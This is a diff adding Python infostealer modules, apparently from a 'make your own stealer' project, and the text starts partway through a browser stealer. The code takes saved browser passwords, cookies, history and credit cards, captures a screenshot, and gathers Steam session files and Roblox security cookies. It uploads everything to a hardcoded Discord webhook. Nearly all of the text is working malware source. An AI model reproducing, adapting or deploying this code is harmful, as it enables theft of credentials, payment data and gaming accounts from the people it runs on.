+    conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT tab_url, target_path FROM downloads')
+    for row in cursor.fetchall():
+        if not row[0] or not row[1]:
+            continue
+        result += f"""
+        Download URL: {row[0]}
+        Local Path: {row[1]}
+        
+        """
+
+    conn.close()
+    os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')
+
+
+def installed_browsers():
+    results = []
+    for browser, path in browsers.items():
+        if os.path.exists(path):
+            results.append(browser)
+    return results
+
+
+if __name__ == '__main__':
+    available_browsers = installed_browsers()
+
+    for browser in available_browsers:
+        browser_path = browsers[browser]
+        master_key = get_master_key(browser_path)
+
+        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
+
+        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
+
+        save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
+
+        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
+
+        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
+        shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')    
+try:
+ os.remove(user+'\\AppData\\Local\\Temp\\Browser')
+except:
+    pass
+with open(user+'\\AppData\\Local\\Temp\\Browser.zip', "rb") as f:
+ files = {"Browser.zip": (user+'\\AppData\\Local\\Temp\\Browser.zip', f)}
+ r = requests.post(hook, files=files)
+ try:
+     os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
+ except:
+     pass
+
+
+
+
+import os.path, requests, os
+from PIL import ImageGrab
+
+user = os.path.expanduser("~")
+
+hook = "https://discord.com/api/webhooks/1086610661099962489/vCddv62w1pd5dl3bSTFFhHq2U_NY_kW_quQWUKn_R2gM9m1g8gu1H0MUH7MZnLJa-VAU"
+
+captura = ImageGrab.grab()
+captura.save(user+"\\AppData\\Local\\Temp\\ss.png")
+
+file = {"file": open(user+"\\AppData\\Local\\Temp\\ss.png", "rb")}
+r = requests.post(hook, files=file)
+try:
+ os.remove(user+"\\AppData\\Local\\Temp\\ss.png")
+except:
+    pass
+
+
+
+import os, os.path, zipfile, requests
+
+hook = "https://discord.com/api/webhooks/1086610661099962489/vCddv62w1pd5dl3bSTFFhHq2U_NY_kW_quQWUKn_R2gM9m1g8gu1H0MUH7MZnLJa-VAU"
+
+steam_path = ""
+if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
+ steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
+ ssfn = []
+ config = ""
+ for file in os.listdir(steam_path):
+     if file[:4] == "ssfn":
+         ssfn.append(steam_path+f"\\{file}")
+     def steam(path,path1,steam_session):
+            for root,dirs,file_name in os.walk(path):
+                for file in file_name:
+                    steam_session.write(root+"\\"+file)
+            for file2 in path1:
+                steam_session.write(file2)
+     if os.path.exists(steam_path+"\\config"):
+      with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
+                steam(steam_path+"\\config",ssfn,zp)
+file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
+r = requests.post(hook, files=file)
+try:
+ os.remove(f"{os.environ['TEMP']}\steam_session.zip")
+except:
+    pass
+  
+  
+  
+  
+import requests, robloxpy, json, browser_cookie3, os.path
+
+user = os.path.expanduser("~")
+
+hook = "https://discord.com/api/webhooks/1086610661099962489/vCddv62w1pd5dl3bSTFFhHq2U_NY_kW_quQWUKn_R2gM9m1g8gu1H0MUH7MZnLJa-VAU"
+
+def robloxl():
+    data = [] 
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')    
+        for cookie in cookies:
+            print(cookie)
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.brave(domain_name='roblox.com')    
+        for cookie in cookies:
+            print(cookie)
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                print("L")
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+cookiesrbx = robloxl()
+
+def rbxsteal():
+ roblox_cookie = cookiesrbx[1]
+ isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
+ if isvalid == "Valid Cookie":
+    isvalid = "Valid"
+ else:
+  exit()
+ ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
+ info = json.loads(ebruh.text)
+ rid = info["UserID"]
+ rap = robloxpy.User.External.GetRAP(rid)
+ friends = robloxpy.User.Friends.External.GetCount(rid)
+ age = robloxpy.User.External.GetAge(rid)
+ dnso = None
+ crdate = robloxpy.User.External.CreationDate(rid)
+ rolimons = f"https://www.rolimons.com/player/{rid}"
+ roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
+ headshot = robloxpy.User.External.GetHeadshot(rid)
+ limiteds = robloxpy.User.External.GetLimiteds(rid)
+
+ username = info['UserName']
+ robux = info['RobuxBalance']
+ premium = info['IsPremium']
+ result = open(user + "\\AppData\\Local\\Temp\\cookierbx.txt", "w")
+ result.write(cookiesrbx[1])
+ result.close()
+ payload = {
+    "embeds": [
+        {
+            "title": "Roblox Stealer!",
+            "description": "Github.com/Lawxsz/make-u-own-stealer",
+            "fields": [
+         {
+             "name": "Username",
+             "value": username,
+             "inline": True
+         },
+         {
+             "name": "Robux Balance",
+             "value": robux,
+             "inline": True
+         },
+         {
+             "name": "Premium",
+             "value": premium,
+             "inline": True
+         },
+         {
+             "name": "Builders Club",
+             "value": info["IsAnyBuildersClubMember"],
+             "inline": True
+         },
+         {
+             "name": "Friends",
+             "value": friends,
+             "inline": True
+         },
+         {
+             "name": "Profile",
+             "value": roblox_profile,
+             "inline": True
+         },
+         {
+             "name": "Age",
+             "value": crdate,
+             "inline": True
+         },
+            ]
+        }
+    ]
+}
+ 
+ headers = {
+    'Content-Type': 'application/json'
+}
+ file = {"file": open(user+f"\\AppData\\Local\\Temp\\cookierbx.txt", 'rb')}
+
+ r = requests.post(hook, data=json.dumps(payload), headers=headers)
+ fil = requests.post(hook, files=file)
+
+rbxsteal() 
